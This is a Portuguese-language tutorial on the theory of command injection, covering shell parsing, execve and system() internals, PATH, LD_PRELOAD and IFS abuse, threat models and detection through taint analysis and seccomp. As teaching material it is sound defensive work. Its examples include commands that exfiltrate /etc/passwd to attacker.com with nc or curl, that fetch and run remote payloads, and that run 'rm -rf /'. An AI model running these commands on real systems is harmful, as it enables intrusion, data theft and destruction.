# Teoria Fundamental de Command Injection

**Criticidade**: 🔴 Crítica (CVSS 9.0-10.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $3,000 - $25,000 USD

---

## 📚 Índice

1. [Fundamentos de Execução de Processos](#fundamentos-de-execução-de-processos)
2. [Shell Parsing e Interpretação](#shell-parsing-e-interpretação)
3. [System Calls e Kernel Interface](#system-calls-e-kernel-interface)
4. [Por Que Command Injection Existe](#por-que-command-injection-existe)
5. [Teoria de Process Spawning](#teoria-de-process-spawning)
6. [Environment Variables e Contexto](#environment-variables-e-contexto)

---

## 🔬 Fundamentos de Execução de Processos

### O Que É Command Injection em Essência?

**Command Injection** é fundamentalmente uma violação da **separação entre dados e instruções** que ocorre quando:

1. **Aplicação executa comandos do sistema operacional**
2. **Input do usuário é concatenado com comando**
3. **Shell interpreta input como sintaxe de comando**

### Modelo de Execução de Comandos

**Definição Formal:**

```
Command Execution = (Program, Arguments, Environment, Context)

Onde:
  Program = executável a ser rodado
  Arguments = lista de strings passadas ao programa
  Environment = variáveis de ambiente (PATH, HOME, etc.)
  Context = working directory, user ID, permissions

Execução segura:
  Arguments são SEMPRE tratados como dados
  Nenhum parsing de shell

Execução insegura:
  Arguments passam por shell parser
  Shell pode interpretar metacaracteres
```

### Por Que Passar por Shell é Perigoso?

**Comparação:**

**Execução Direta (Segura):**
```python
# Python
import subprocess
subprocess.run(['/bin/ping', '-c', '1', user_input])
#               ↑ Program     ↑ Args (lista)

# Sistema operacional:
execve('/bin/ping', ['/bin/ping', '-c', '1', '192.168.1.1'], env)
#       ↑ Binary           ↑ argv[] array (sem parsing!)
```

**Execução via Shell (Insegura):**
```python
# Python
import os
os.system(f'ping -c 1 {user_input}')
#         ↑ String concatenada

# Sistema operacional:
execve('/bin/sh', ['/bin/sh', '-c', 'ping -c 1 192.168.1.1; whoami'], env)
#       ↑ Shell          ↑ Command string (COM parsing!)
```

**Problema:**
```
Execução direta:
  argv[0] = '/bin/ping'
  argv[1] = '-c'
  argv[2] = '1'
  argv[3] = '192.168.1.1; whoami'  ← Tratado como STRING literal

  ping recebe: "192.168.1.1; whoami" (um único argumento)
  Resultado: ping fails (invalid hostname)

Execução via shell:
  Shell parser processa: "ping -c 1 192.168.1.1; whoami"
  Tokenização:
    - Comando 1: ping -c 1 192.168.1.1
    - Separador: ;
    - Comando 2: whoami  ← INJETADO!

  Resultado: Ambos comandos executam!
```

---

## 🐚 Shell Parsing e Interpretação

### Bash Parser - Fases de Processamento

**Pipeline Completo:**

```
Input String
    ↓
1. Lexical Analysis (Tokenization)
    ↓
2. Expansion (Variable, Command, Brace, etc.)
    ↓
3. Parsing (Syntax Analysis)
    ↓
4. Command Execution
```

### Fase 1: Tokenização

**Shell Grammar (Simplified BNF):**

```bnf
<command> ::= <simple_command>
            | <pipeline>
            | <compound_command>

<simple_command> ::= <word>+

<pipeline> ::= <command> '|' <command>

<compound_command> ::= <command> ';' <command>
                     | <command> '&&' <command>
                     | <command> '||' <command>
                     | <command> '&'

<word> ::= <character>+ | <quoted_string>
```

**Metacaracteres Especiais:**

```
; & | && || ( ) $ ` \ " ' < > * ? [ ] # ~ = %

Cada um tem significado SINTÁTICO para o shell:
  ; → Command separator
  & → Background execution
  | → Pipe
  && → AND operator
  || → OR operator
  $ → Variable expansion
  ` → Command substitution (deprecated)
  \ → Escape character
  " → Double quote (weak quoting)
  ' → Single quote (strong quoting)
  < → Input redirection
  > → Output redirection
  * → Glob wildcard
```

**Exemplo de Tokenização:**

```bash
Input: echo "Hello"; whoami

Tokens:
[WORD: echo]
[WORD: "Hello"]
[SEPARATOR: ;]
[WORD: whoami]

Parse Tree:
    CompoundCommand
         |
    +---------+
    |         |
SimpleCmd  SimpleCmd
    |         |
  echo      whoami
    |
 "Hello"
```

### Fase 2: Expansion

**Tipos de Expansion (em ordem):**

```bash
1. Brace Expansion
   {a,b,c} → a b c

2. Tilde Expansion
   ~/file → /home/user/file

3. Parameter & Variable Expansion
   $VAR → value_of_VAR
   ${VAR} → value_of_VAR

4. Command Substitution
   $(command) → output_of_command
   `command` → output_of_command (deprecated)

5. Arithmetic Expansion
   $((1+1)) → 2

6. Process Substitution
   <(command) → /dev/fd/63 (FIFO)

7. Word Splitting
   "a b c" → [a] [b] [c]

8. Pathname Expansion (Globbing)
   *.txt → file1.txt file2.txt

9. Quote Removal
   "hello" → hello
```

**Command Injection via Expansion:**

```bash
# Input malicioso:
user_input = "$(whoami)"

# Command:
echo "Hello, $user_input"

# Após parameter expansion:
echo "Hello, $(whoami)"

# Após command substitution:
echo "Hello, root"
# ↑ whoami foi EXECUTADO durante expansion!
```

### Fase 3: Parsing

**AST Construction:**

```bash
Input: cat file.txt | grep "pattern" && echo "Found"

AST:
           LogicalAND
              |
      +---------------+
      |               |
   Pipeline        SimpleCmd
      |               |
  +-------+         echo
  |       |           |
 cat     grep      "Found"
  |       |
file.txt "pattern"
```

**Por que Command Injection Funciona:**

```
Shell parser não distingue:
  - Tokens de comando original
  - Tokens de input do usuário

Ambos são processados IDENTICAMENTE:

Original: cat file.txt
Injetado: cat file.txt; rm -rf /

Tokens:
  [cat] [file.txt] [;] [rm] [-rf] [/]
              ↑ Tudo é válido!

Parser não tem conceito de "origem suspeita"
```

---

## ⚙️ System Calls e Kernel Interface

### execve() - The Ultimate System Call

**Signature:**

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

**O que faz:**
```
1. Carrega programa 'pathname' do disco
2. Substitui imagem do processo atual
3. Passa argumentos via argv[]
4. Passa ambiente via envp[]
5. Inicia execução

Importante: execve() NÃO retorna (exceto em erro)
            Processo atual é SUBSTITUÍDO
```

**Implementação (Linux Kernel):**

```c
// fs/exec.c
SYSCALL_DEFINE3(execve,
                const char __user *, filename,
                const char __user *const __user *, argv,
                const char __user *const __user *, envp)
{
    return do_execve(getname(filename), argv, envp);
}

static int do_execve(struct filename *filename,
                     const char __user *const __user *argv,
                     const char __user *const __user *envp)
{
    struct linux_binprm *bprm;

    // 1. Alocar estrutura de execução
    bprm = kzalloc(sizeof(*bprm), GFP_KERNEL);

    // 2. Abrir arquivo executável
    bprm->file = open_exec(filename);

    // 3. Preparar argumentos e ambiente
    bprm->argc = count(argv);
    bprm->envc = count(envp);

    // 4. Ler e validar header do executável (ELF)
    search_binary_handler(bprm);

    // 5. Carregar segmentos do executável na memória
    load_elf_binary(bprm);

    // 6. Configurar stack com argv e envp
    create_elf_tables(bprm);

    // 7. Transferir controle para novo programa
    start_thread(regs, elf_entry, bprm->p);
}
```

### fork() + exec() Pattern

**O Pattern Clássico:**

```c
// Parent process quer executar comando
pid_t pid = fork();

if (pid == 0) {
    // Child process
    char *argv[] = {"/bin/ls", "-la", NULL};
    char *envp[] = {NULL};
    execve("/bin/ls", argv, envp);
    // Se chegou aqui, execve falhou
    perror("execve");
    exit(1);
} else {
    // Parent process
    wait(NULL);  // Aguarda child terminar
}
```

**Memory Layout:**

```
ANTES do fork():
  Parent Process
  +-----------------+
  | Code Segment    |
  | Data Segment    |
  | Heap            |
  | Stack           |
  +-----------------+

DEPOIS do fork():
  Parent Process          Child Process (clone)
  +-----------------+    +-----------------+
  | Code Segment    |    | Code Segment    |
  | Data Segment    |    | Data Segment    |  ← Copy-on-Write
  | Heap            |    | Heap            |
  | Stack           |    | Stack           |
  +-----------------+    +-----------------+

DEPOIS do execve() no child:
  Parent Process          Child Process (substituído)
  +-----------------+    +-----------------+
  | Code Segment    |    | /bin/ls Code    | ← Novo programa!
  | Data Segment    |    | /bin/ls Data    |
  | Heap            |    | /bin/ls Heap    |
  | Stack           |    | /bin/ls Stack   |
  +-----------------+    +-----------------+
```

### system() - The Dangerous Wrapper

**Implementação (glibc):**

```c
// sysdeps/posix/system.c
int system(const char *command)
{
    pid_t pid;
    int status;

    if (command == NULL)
        return 1;  // Shell available?

    pid = fork();
    if (pid == 0) {
        // Child process
        execl("/bin/sh", "sh", "-c", command, (char *) NULL);
        //     ↑ SHELL!       ↑ -c: execute command string
        _exit(127);
    }

    // Parent waits
    waitpid(pid, &status, 0);
    return status;
}
```

**Por que system() é perigoso:**

```c
// Uso:
char cmd[256];
snprintf(cmd, sizeof(cmd), "ping -c 1 %s", user_input);
system(cmd);

// O que acontece:
fork() → cria child
child executa: execl("/bin/sh", "sh", "-c", "ping -c 1 192.168.1.1; whoami", NULL)
                      ↑ Shell parser processa TODA a string!

// Shell interpreta:
;  → Separator (dois comandos!)
whoami → Segundo comando

// Resultado: RCE!
```

---

## 🚫 Por Que Command Injection Existe

### 1. Decisões de Design Histórico

**Era Unix (1970s):**

```c
// Original Unix system() (aprox. 1975)
void system(char *s) {
    int status, pid, w;

    if ((pid = fork()) == 0) {
        execl("/bin/sh", "sh", "-c", s, 0);
        exit(127);
    }
}
```

**Por que system() foi criado assim:**
- **Conveniente**: Desenvolvedores queriam uma forma fácil de rodar comandos
- **Flexível**: Shell permite pipes, redirecionamentos, variáveis
- **Poderoso**: Pode fazer coisas complexas em uma linha
- **Sem consciência de segurança**: Não havia atacantes remotos nos anos 70

### 2. Shell como Linguagem de Programação

**Shell é uma linguagem Turing-complete:**

```bash
# Loops
for i in {1..10}; do echo $i; done

# Condicionais
if [ -f file.txt ]; then cat file.txt; fi

# Funções
function greet() { echo "Hello, $1"; }

# Variáveis
name="John"
echo "Hello, $name"

# Pipes e redirecionamentos
cat file.txt | grep pattern | sort | uniq > output.txt
```

**Problema:**
```
Usuário pode injetar QUALQUER construção sintática do shell!

- Loops: for i in ...; do rm ...; done
- Pipes: cat /etc/passwd | nc attacker.com 4444
- Redirecionamentos: cat /etc/shadow > /var/www/html/shadow.txt
- Command substitution: echo $(curl http://attacker.com/malware.sh | sh)
```

### 3. Múltiplas Camadas de Interpretação

**Stack de Interpretação:**

```
Application (Python/PHP/Ruby)
    ↓
String Construction (concatenation)
    ↓
OS System Call (system(), popen())
    ↓
Shell (/bin/sh, /bin/bash)
    ↓
Shell Parser (tokenization, expansion)
    ↓
Kernel (execve())
    ↓
Program Execution
```

**Cada camada pode interpretar:**

```python
# Python layer
cmd = f"ping -c 1 {user_input}"
# user_input = "192.168.1.1 $(whoami)"

# String construction
# cmd = "ping -c 1 192.168.1.1 $(whoami)"

# system() call
os.system(cmd)

# Shell layer
# Parser vê: ping -c 1 192.168.1.1 $(whoami)
# Expansion: $(whoami) → command substitution
# Executa whoami, substitui output

# Kernel layer
# execve("/bin/ping", ["ping", "-c", "1", "192.168.1.1"], env)
# execve("/usr/bin/whoami", ["whoami"], env)  ← INJETADO!
```

---

## 🧬 Teoria de Process Spawning

### Process Creation Models

**Model 1: fork/exec (Unix)**

```
Advantages:
  ✓ Flexible (can setup pipes, redirections before exec)
  ✓ Child inherits file descriptors
  ✓ Copy-on-write efficient

Disadvantages:
  ✗ Two system calls needed
  ✗ Memory duplication (even with COW)
  ✗ Slower
```

**Model 2: posix_spawn()**

```c
// Modern alternative to fork/exec
int posix_spawn(pid_t *pid,
                const char *path,
                const posix_spawn_file_actions_t *file_actions,
                const posix_spawnattr_t *attrp,
                char *const argv[],
                char *const envp[]);
```

**Advantages:**
```
✓ Mais eficiente (kernel pode otimizar)
✓ Um system call
✓ Mais seguro (menos oportunidades de race conditions)
✓ Não passa por shell por padrão
```

**Model 3: CreateProcess (Windows)**

```c
BOOL CreateProcess(
    LPCSTR lpApplicationName,     // Program to execute
    LPSTR lpCommandLine,           // Command line (DANGEROUS if constructed!)
    // ... outros parâmetros
);
```

**Windows Command Injection:**

```c
// Vulnerable
char cmd[256];
sprintf(cmd, "cmd.exe /c ping %s", user_input);
CreateProcess(NULL, cmd, ...);

// user_input = "192.168.1.1 & whoami"
// Executa: cmd.exe /c ping 192.168.1.1 & whoami
//                                        ↑ Command separator!
```

### Pipe Communication

**Criação de Pipes:**

```c
int pipefd[2];
pipe(pipefd);  // pipefd[0] = read end, pipefd[1] = write end

pid_t pid = fork();
if (pid == 0) {
    // Child: execute command, redirect stdout to pipe
    close(pipefd[0]);           // Close unused read end
    dup2(pipefd[1], STDOUT_FILENO);  // stdout → pipe write end
    close(pipefd[1]);

    execlp("ls", "ls", "-la", NULL);
} else {
    // Parent: read from pipe
    close(pipefd[1]);           // Close unused write end
    char buffer[4096];
    read(pipefd[0], buffer, sizeof(buffer));
    close(pipefd[0]);
}
```

**Command Injection via Pipes:**

```python
# Vulnerable: usando shell
import subprocess
result = subprocess.check_output(f"cat {filename} | grep pattern", shell=True)

# Injection:
filename = "file.txt; cat /etc/passwd |"
# Executa: cat file.txt; cat /etc/passwd | | grep pattern
#                        ↑ /etc/passwd vazado!
```

---

## 🌍 Environment Variables e Contexto

### Environment Variables Perigosas

**PATH Hijacking:**

```bash
# Application executa:
system("ls");  # Sem caminho absoluto!

# Atacante controla PATH:
export PATH=/tmp:$PATH
cat > /tmp/ls << EOF
#!/bin/bash
curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
/bin/ls "$@"  # Execute real ls para não levantar suspeitas
EOF
chmod +x /tmp/ls

# Quando app executa "ls":
# Shell busca em PATH
# Encontra /tmp/ls primeiro → BACKDOOR EXECUTA!
```

**LD_PRELOAD Injection:**

```bash
# Atacante cria biblioteca maliciosa:
// malicious.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>

int puts(const char *s) {
    // Hook puts() function
    system("curl http://attacker.com/beacon");

    // Call original puts
    int (*original_puts)(const char *) = dlsym(RTLD_NEXT, "puts");
    return original_puts(s);
}

# Compile
gcc -shared -fPIC malicious.c -o malicious.so -ldl

# Export
export LD_PRELOAD=/tmp/malicious.so

# Qualquer programa que chamar puts() executa backdoor!
```

**IFS (Internal Field Separator) Exploitation:**

```bash
# Normal IFS: space, tab, newline
IFS=$' \t\n'

# Atacante modifica:
IFS='/'

# Application executa:
system("cat /etc/passwd");

# Shell interpreta com IFS=/
# Tokeniza: [cat] [etc] [passwd]
# Busca "cat" em PATH
# Busca "etc" como comando!

# Se atacante criou /tmp/etc:
export PATH=/tmp:$PATH
echo '#!/bin/bash\nwhoami' > /tmp/etc
chmod +x /tmp/etc

# Resultado: /tmp/etc executa ao invés de acessar /etc/passwd!
```

### Process Context

**Effective User ID (EUID):**

```c
// Program com setuid bit (roda como root)
// -rwsr-xr-x  1 root root  12345 backup_script

int main() {
    // Vulnerable: passa por shell
    system("cp /home/user/file.txt /backup/");
    //     ↑ Executa com EUID=0 (root)!
}

// Injection:
// Symlink: ln -s /etc/shadow /home/user/file.txt
// Resultado: /etc/shadow copiado para /backup/ com permissões de root!
```

**Capabilities (Linux):**

```bash
# Program com CAP_NET_RAW capability
# Pode criar raw sockets mesmo sem ser root

# Vulnerable code:
system("ping -c 1 " + user_input);
# Executa com capability herdada!

# Injection:
user_input = "192.168.1.1; python3 raw_socket_backdoor.py"
# Backdoor herda CAP_NET_RAW → pode fazer packet sniffing!
```

---

## 🔐 Análise de Segurança Formal

### Definição de Segurança

**Um sistema é seguro se:**

```
∀ input ∈ User_Input:
  Executed_Commands(input) ⊆ Intended_Commands

Onde:
  Executed_Commands = conjunto de comandos realmente executados
  Intended_Commands = conjunto de comandos pretendidos pelo desenvolvedor
```

**Command Injection viola:**

```
Exemplo:
  Intended: ping -c 1 {IP}
  Intended_Commands = {ping}

  Input: "192.168.1.1; whoami"
  Executed_Commands = {ping, whoami}

  {ping, whoami} ⊄ {ping}  → VIOLAÇÃO!
```

### Modelo de Ameaça

**Capability do Atacante:**

```
Level 1: Read-only access
  - Pode exfiltrar dados
  - cat /etc/passwd | nc attacker.com 4444

Level 2: Write access
  - Pode modificar sistema
  - echo "malware" > /var/www/html/backdoor.php

Level 3: Execute access
  - Pode rodar programas arbitrários
  - wget http://attacker.com/malware && chmod +x malware && ./malware

Level 4: Root/Admin access
  - Full system compromise
  - Se app roda como root ou com sudo
```

**Privilege Escalation:**

```
Scenario: Application roda como usuário limitado (www-data)

Chain:
1. Command injection → RCE como www-data
2. Enumeration → find /usr/bin -perm -4000 (setuid binaries)
3. Exploit setuid bug → Escalate to root
4. Persistence → Add SSH key, install rootkit

Full compromise!
```

---

## 📊 Complexidade de Detecção

### Static Analysis

**Problema:** Detectar command injection em código

```
Challenge: Identificar se variável é usada em system()

def foo(x):
    y = process(x)
    z = transform(y)
    system("ls " + z)  # z vem de x?

Solução: Taint analysis (data flow)

Sources: user input (GET, POST, argv)
Sinks: system(), exec(), popen()
Propagation: track data flow

Se source → sink sem sanitização: VULNERABILITY!
```

**Complexidade:**

```
Geral: Undecidable (Halting Problem)
  - Não é possível determinar todos caminhos de execução

Prático: NP-hard
  - Aproximações são possíveis
  - False positives e false negatives
```

### Runtime Detection

**Syscall Monitoring:**

```c
// Using ptrace() to monitor child process
ptrace(PTRACE_SYSCALL, child_pid, NULL, NULL);

// Cada syscall do child gera SIGTRAP no parent
// Parent pode inspecionar syscall:

struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, child_pid, NULL, &regs);

if (regs.orig_rax == __NR_execve) {
    // Child está tentando executar programa!
    // Ler argumentos e decidir: permitir ou bloquear
}
```

**Seccomp (Secure Computing Mode):**

```c
// Restringir syscalls permitidos
#include <seccomp.h>

scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  // Default: kill process
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
// NÃO permite execve → Previne command execution!
seccomp_load(ctx);
```

---

**Última atualização**: 2024
**Versão**: 1.0 - Documento Teórico Fundamental
